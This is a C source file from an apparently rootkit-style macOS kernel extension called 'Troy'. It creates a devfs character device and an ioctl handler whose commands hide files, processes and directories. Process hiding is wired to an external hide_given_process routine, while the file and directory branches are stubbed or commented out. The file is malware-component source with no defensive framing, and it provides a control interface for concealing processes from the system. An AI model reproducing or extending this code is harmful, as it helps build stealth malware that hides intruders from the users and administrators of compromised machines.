//
//  Control.c
//  Troy
//
//  Created by Axis on 5/7/15.
//  Copyright (c) 2015 Axis. All rights reserved.
//

#include <string.h>
#include <sys/proc.h>
#include <libkern/libkern.h>
#include <mach/mach_types.h>
#include <kern/kern_types.h>
#include <miscfs/devfs/devfs.h>

#include "Control.h"
#include "configure.h"
#include "debugInfo.h"
#include "HookCAPI.h"

errno_t init_troy_components();
int  troy_ioctl_fn(dev_t dev, u_long cmd, caddr_t data, int fflag, struct proc *p);

static int g_dev_major=-1;
static void *g_fs_mac_dev=NULL;

struct cdevsw troy_fops= {
    .d_open=eno_opcl,		// open_close_fcn_t
    .d_close=eno_opcl,		// open_close_fcn_t
    .d_read=nullread,		// read_write_fcn_t
    .d_write=nullwrite,		// read_write_fcn_t
    .d_ioctl=troy_ioctl_fn,		// ioctl_fcn_t
    .d_stop=nullstop,		// stop_fcn_t
    .d_reset=nullreset,		// reset_fcn_t
    .d_ttys=0,			// struct tty
    .d_select=eno_select,		// select_fcn_t
    .d_mmap=eno_mmap,		// mmap_fcn_t
    .d_strategy=eno_strat,		// strategy_fcn_t
    .d_reserved_1=eno_getc,		// getc_fcn_t
    .d_reserved_2=eno_putc,		// putc_fcn_t
    .d_type=D_TTY,			// int
};

int  troy_ioctl_fn(dev_t dev, u_long cmd, caddr_t data, int fflag, struct proc *p)
{
    switch (cmd) {
        case TROY_CMD_HIDE_FILE:
        {
//            troy_hide_object *file_hide = (troy_hide_object*)data;
//            if(file_hide==NULL) return TROY_ERROR_INVALID_PARAMETER;
//            if(file_hide->objec_type!=TROY_FILE) return TROY_ERROR_NOT_MATCH;

        }break;
        case TROY_CMD_HIDE_PROCESS:
        {
            troy_hide_object *process_hide = (troy_hide_object*)data;
            errno_t return_code = hide_given_process(process_hide);
            if(return_code!=TROY_SUCCESS)
            {
                LOG(LOG_ERROR, "hide process error, error code is %d", return_code);
                break;
            }
            LOG(LOG_DEBUG, "hide process successfully");
        }break;

        case TROY_CMD_HIDE_DIR:
        {

        }break;

        default:
        {

        }
    }
    return 0;
}

//
errno_t init_troy_components()
{
    LOG(LOG_DEBUG, "Enter");
    g_dev_major = cdevsw_add(-1, &troy_fops);   //add file operation to the device file
    if(g_dev_major==-1)
    {
        LOG(LOG_ERROR, "create device file falied, g_dev_major=%d", g_dev_major);
        return KERN_FAILURE;
    }

    g_fs_mac_dev=devfs_make_node(makedev(g_dev_major, 0), DEVFS_CHAR, UID_ROOT,
                                 GID_KMEM, 0640, TROY_DEV_NAME);
    if(g_fs_mac_dev==NULL)
    {
        LOG(LOG_ERROR, "Failed to call devfs_make_node");
        return KERN_FAILURE;
    }
    LOG(LOG_DEBUG, "Leave");

    return KERN_SUCCESS;
}

errno_t destroy_troy_component()
{
    LOG(LOG_DEBUG, "Enter");
    int return_code = KERN_SUCCESS;

    if(g_fs_mac_dev!=NULL)
    {
        devfs_remove(g_fs_mac_dev);
        g_fs_mac_dev=NULL;
    }

    if(g_dev_major!=-1)
    {
        return_code=cdevsw_remove(g_dev_major, &troy_fops);
        if(return_code!=g_dev_major)
        {
            LOG(LOG_ERROR, "remove device failed, return code is %d", return_code);
            return_code = KERN_FAILURE;
        }
        else
        {
            return_code = KERN_SUCCESS;
        }
    }
    return return_code;
}